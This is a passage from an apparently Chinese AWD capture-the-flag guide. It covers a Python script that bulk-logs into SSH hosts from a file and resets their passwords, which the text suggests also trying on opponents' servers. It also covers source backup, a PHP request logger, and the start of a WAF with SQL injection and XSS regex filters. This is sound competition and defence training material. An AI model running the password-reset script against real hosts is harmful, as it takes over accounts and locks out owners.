/pre></p>\n<p>我们改密码是为了防止被别人弱口令爆破，或者密码是默认的情况导致服务器丢失，这里我们也可以尝试去更改别人的密码</p>\n<p><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> paramiko\n<span class=\"token keyword\">import</span> sys\n\nssh_clients <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\ntimeout <span class=\"token operator\">=</span> <span class=\"token number\">5</span>\nnew_password <span class=\"token operator\">=</span> <span class=\"token string\">\"xcxy@ncwss123\"</span>\n\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">SSH_Client</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> host<span class=\"token punctuation\">,</span> port<span class=\"token punctuation\">,</span> username<span class=\"token punctuation\">,</span> password<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        self<span class=\"token punctuation\">.</span>is_root <span class=\"token operator\">=</span> <span class=\"token boolean\">False</span>\n        self<span class=\"token punctuation\">.</span>host <span class=\"token operator\">=</span> host\n        self<span class=\"token punctuation\">.</span>port <span class=\"token operator\">=</span> port\n        self<span class=\"token punctuation\">.</span>username <span class=\"token operator\">=</span> username\n        self<span class=\"token punctuation\">.</span>password <span class=\"token operator\">=</span> password\n        self<span class=\"token punctuation\">.</span>ssh <span class=\"token operator\">=</span> paramiko<span class=\"token punctuation\">.</span>SSHClient<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        self<span class=\"token punctuation\">.</span>ssh<span class=\"token punctuation\">.</span>set_missing_host_key_policy<span class=\"token punctuation\">(</span>paramiko<span class=\"token punctuation\">.</span>AutoAddPolicy<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        self<span class=\"token punctuation\">.</span>ssh<span class=\"token punctuation\">.</span>connect<span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>host<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>port<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>username<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>password<span class=\"token punctuation\">,</span> timeout<span class=\"token operator\">=</span>timeout<span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">exec_command</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> command<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        stdin<span class=\"token punctuation\">,</span> stdout<span class=\"token punctuation\">,</span> stderr <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>ssh<span class=\"token punctuation\">.</span>exec_command<span class=\"token punctuation\">(</span>command<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">return</span> stdin<span class=\"token punctuation\">,</span> stdout<span class=\"token punctuation\">,</span> stderr\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">change_password</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        stdin<span class=\"token punctuation\">,</span> stdout<span class=\"token punctuation\">,</span> stderr <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>exec_command<span class=\"token punctuation\">(</span><span class=\"token string\">\"passwd\"</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">if</span> self<span class=\"token punctuation\">.</span>username <span class=\"token operator\">!=</span> <span class=\"token string\">\"root\"</span><span class=\"token punctuation\">:</span>\n            stdin<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token string\">\"%s\\n\"</span> <span class=\"token operator\">%</span> self<span class=\"token punctuation\">.</span>password<span class=\"token punctuation\">)</span>\n        stdin<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token string\">\"%s\\n\"</span> <span class=\"token operator\">%</span> new_password<span class=\"token punctuation\">)</span>\n        stdin<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token string\">\"%s\\n\"</span> <span class=\"token operator\">%</span> new_password<span class=\"token punctuation\">)</span>\n        stdout<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">if</span> <span class=\"token string\">\"success\"</span> <span class=\"token keyword\">in</span> stderr<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token string\">'utf-8'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n            self<span class=\"token punctuation\">.</span>password <span class=\"token operator\">=</span> new_password\n            <span class=\"token keyword\">return</span> <span class=\"token boolean\">True</span>\n        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">return</span> <span class=\"token boolean\">False</span>\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">save_log</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> filename<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>filename<span class=\"token punctuation\">,</span> <span class=\"token string\">\"a+\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span>\n            f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token string\">\"%s %s %s %s\\n\"</span> <span class=\"token operator\">%</span> <span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>host<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>port<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>username<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>password<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Usage:\"</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\t python %s [FILENAME]\"</span> <span class=\"token operator\">%</span> <span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        exit<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n    filename <span class=\"token operator\">=</span> sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\" [+] Loading file : %s\"</span> <span class=\"token operator\">%</span> filename<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>filename<span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">for</span> line <span class=\"token keyword\">in</span> f<span class=\"token punctuation\">:</span>\n            line <span class=\"token operator\">=</span> line<span class=\"token punctuation\">.</span>rstrip<span class=\"token punctuation\">(</span><span class=\"token string\">\"\\n\"</span><span class=\"token punctuation\">)</span>\n            data <span class=\"token operator\">=</span> line<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">\" \"</span><span class=\"token punctuation\">)</span>\n            host <span class=\"token operator\">=</span> data<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span>\n            port <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n            username <span class=\"token operator\">=</span> data<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span>\n            password <span class=\"token operator\">=</span> data<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span>\n            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\" [+] Trying login : %s\"</span> <span class=\"token operator\">%</span> host<span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span>\n                ssh_client <span class=\"token operator\">=</span> SSH_Client<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span> port<span class=\"token punctuation\">,</span> username<span class=\"token punctuation\">,</span> password<span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">except</span> Exception <span class=\"token keyword\">as</span> e<span class=\"token punctuation\">:</span>\n                <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\" [-] %s\"</span> <span class=\"token operator\">%</span> e<span class=\"token punctuation\">)</span>\n                <span class=\"token keyword\">continue</span>\n            ssh_clients<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>ssh_client<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\" [+] Login finished. \"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\" [+&#125; Got [%d] clients. \"</span> <span class=\"token operator\">%</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>ssh_clients<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>ssh_clients<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span>\n        exit<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\" [+] Starting changing password. \"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">for</span> ssh_client <span class=\"token keyword\">in</span> ssh_clients<span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">if</span> ssh_client<span class=\"token punctuation\">.</span>change_password<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\" [+] %s (Success!)\"</span> <span class=\"token operator\">%</span> ssh_client<span class=\"token punctuation\">.</span>host<span class=\"token punctuation\">)</span>\n            ssh_client<span class=\"token punctuation\">.</span>save_log<span class=\"token punctuation\">(</span><span class=\"token string\">\"success.log\"</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\" [+] %s (Failed!)\"</span> <span class=\"token operator\">%</span> ssh_client<span class=\"token punctuation\">.</span>host<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\" [+] something like interesting!!! \"</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<h2 id=\"下载源码备份\"><a class=\"anchor\" href=\"#下载源码备份\">#</a> 下载源码，备份</h2>\n<p>使用 ssh 工具保留源码，复制两份，用 d 盾去扫一份<br />\n以免网站崩溃的时候无法及时恢复，导致 check 丢分</p>\n<h2 id=\"防御\"><a class=\"anchor\" href=\"#防御\">#</a> 防御</h2>\n<p>上面提到我们将源码 down 下来后利用 d 盾等工具扫描，将爆出来的 shell 注释修改或者删除等（具体怎么改根据比赛要求）</p>\n<p>接着就是监控脚本</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n<span class=\"token function\">define</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'LOG_FILEDIR'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'/tmp/loooooooogs'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 日志文件目录</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">is_dir</span><span class=\"token punctuation\">(</span><span class=\"token constant\">LOG_FILEDIR</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token comment\">// 如果目录不存在则创建</span>\n\t<span class=\"token function\">mkdir</span><span class=\"token punctuation\">(</span><span class=\"token constant\">LOG_FILEDIR</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 创建目录</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">function</span> <span class=\"token function-definition function\">waf</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> \n<span class=\"token punctuation\">&#123;</span> \n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">function_exists</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'getallheaders'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> \n<span class=\"token keyword\">function</span> <span class=\"token function-definition function\">getallheaders</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token comment\">// 获取所有的头信息</span>\n<span class=\"token keyword\">foreach</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_SERVER</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$name</span> <span class=\"token operator\">=></span> <span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token comment\">// 循环获取所有的头信息</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$name</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token string single-quoted-string\">'HTTP_'</span><span class=\"token punctuation\">)</span> \n<span class=\"token variable\">$headers</span><span class=\"token punctuation\">[</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">' '</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'-'</span><span class=\"token punctuation\">,</span> <span class=\"token function\">ucwords</span><span class=\"token punctuation\">(</span><span class=\"token function\">strtolower</span><span class=\"token punctuation\">(</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'_'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">' '</span><span class=\"token punctuation\">,</span> <span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$name</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$value</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 将头信息的名称替换为小写，并将下划线替换为空格</span>\n<span class=\"token punctuation\">&#125;</span> \n<span class=\"token keyword\">return</span> <span class=\"token variable\">$headers</span><span class=\"token punctuation\">;</span> \n<span class=\"token punctuation\">&#125;</span> \n<span class=\"token punctuation\">&#125;</span> \n<span class=\"token variable\">$get</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 获取 get 参数 </span>\n<span class=\"token variable\">$post</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 获取 post 参数</span>\n<span class=\"token variable\">$cookie</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 获取 cookie 参数</span>\n<span class=\"token variable\">$header</span> <span class=\"token operator\">=</span> <span class=\"token function\">getallheaders</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 获取所有的头信息</span>\n<span class=\"token variable\">$files</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 获取所有的上传文件信息</span>\n<span class=\"token variable\">$ip</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"REMOTE_ADDR\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 获取客户端 ip</span>\n<span class=\"token variable\">$method</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'REQUEST_METHOD'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 获取请求方式</span>\n<span class=\"token variable\">$filepath</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"SCRIPT_NAME\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 获取文件路径</span>\n<span class=\"token keyword\">foreach</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$key</span> <span class=\"token operator\">=></span> <span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token comment\">// 循环获取所有的上传文件信息</span>\n<span class=\"token variable\">$files</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'content'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'tmp_name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 获取文件内容</span>\n<span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'tmp_name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"virink\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 写入文件</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">unset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$header</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'Accept'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 删除头信息中的 Accept</span>\n<span class=\"token variable\">$input</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Get\"</span><span class=\"token operator\">=></span><span class=\"token variable\">$get</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"Post\"</span><span class=\"token operator\">=></span><span class=\"token variable\">$post</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"Cookie\"</span><span class=\"token operator\">=></span><span class=\"token variable\">$cookie</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"File\"</span><span class=\"token operator\">=></span><span class=\"token variable\">$files</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"Header\"</span><span class=\"token operator\">=></span><span class=\"token variable\">$header</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 将所有的参数合并成一个数组</span>\n\n<span class=\"token function\">logging</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$input</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 调用日志函数</span>\n\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">function</span> <span class=\"token function-definition function\">logging</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$var</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span> <span class=\"token comment\">// 日志函数</span>\n<span class=\"token variable\">$filename</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'REMOTE_ADDR'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 获取客户端 ip</span>\n<span class=\"token variable\">$LOG_FILENAME</span> <span class=\"token operator\">=</span> <span class=\"token constant\">LOG_FILEDIR</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"/\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$filename</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 日志文件路径</span>\n<span class=\"token variable\">$time</span> <span class=\"token operator\">=</span> <span class=\"token function\">date</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Y-m-d G:i:s\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 获取当前时间</span>\n<span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$LOG_FILENAME</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"\\r\\n\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$time</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\\r\\n\"</span><span class=\"token operator\">.</span><span class=\"token function\">print_r</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$var</span><span class=\"token punctuation\">,</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">FILE_APPEND</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 写入日志文件</span>\n\n<span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$LOG_FILENAME</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"\\r\\n\"</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'http://'</span><span class=\"token operator\">.</span><span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'HTTP_HOST'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'PHP_SELF'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'?'</span><span class=\"token operator\">.</span><span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'QUERY_STRING'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">FILE_APPEND</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 写入日志文件</span>\n\n<span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$LOG_FILENAME</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"\\r\\n***************************************************************\"</span><span class=\"token punctuation\">,</span><span class=\"token constant\">FILE_APPEND</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 写入日志文件</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token function\">waf</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>如果可以我们还可以上通防（一般都是不行）</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token comment\">&lt;!-- \nrequire_once('waf.php')\n\nPHPCMS V9 \\phpcms\\base.php\nPHPWIND8.7 \\data\\sql_config.php\nDEDECMS5.7 \\data\\common.inc.php\nDiscuzX2   \\config\\config_global.php\nWordpress   \\wp-config.php\nMetinfo   \\include\\head.php\n--></span>\n\n<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n\n<span class=\"token keyword\">function</span> <span class=\"token function-definition function\">customError</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$errno</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$errstr</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$errfile</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$errline</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;b>Error number:&lt;/b> [<span class=\"token interpolation\"><span class=\"token variable\">$errno</span></span>],error on line <span class=\"token interpolation\"><span class=\"token variable\">$errline</span></span> in <span class=\"token interpolation\"><span class=\"token variable\">$errfile</span></span>&lt;br />\"</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token function\">set_error_handler</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"customError\"</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">E_ERROR</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$getfilter</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"'|(and|or)\\\\b.+?(>|&lt;|=|in|like)|\\\\/\\\\*.+?\\\\*\\\\/|&lt;\\\\s*script\\\\b|\\\\bEXEC\\\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\\\s+(TABLE|DATABASE)\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$postfilter</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"\\\\b(and|or)\\\\b.&#123;1,6&#125;?(=|>|&lt;|\\\\bin\\b|\\\\blike\\\\b)|\\\\/\\\\*.+?\\\\*\\\\/|&lt;\\\\s*script\\\\b|\\\\bEXEC\\\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\\\s+(TABLE|DATABASE)\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$cookiefilter</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"\\\\b(and|or)\\\\b.&#123;1.6&#125;?(=|>|&lt;|\\\\bin\\\\b|\\\\blike\\\\b)|\\\\/\\\\*.+?\\\\*\\\\/|&lt;\\\\s*script\\\\b|\\\\bEXEC\\\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\\\s+(TABLE|DATABASE)\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">function</span> <span class=\"token function-definition 